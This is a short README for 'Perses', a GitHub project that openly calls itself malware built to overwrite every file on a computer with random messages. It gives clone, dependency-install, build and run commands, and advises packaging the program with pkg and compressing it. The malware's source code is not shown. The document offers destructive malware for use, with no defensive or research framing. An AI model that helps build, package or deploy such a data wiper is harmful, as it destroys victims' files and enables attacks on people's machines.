# Perses
Simple malware that rewrites all files in a computer with random messages.

## Installation
Github:
```
git clone https://github.com/I2rys/perses
```

NpmJS:
```
npm i path os fs
```

## Build
Use [pkg](https://www.npmjs.com/package/pkg) to build Perses and make sure to compress it.

## Usage
```
node index.js
```
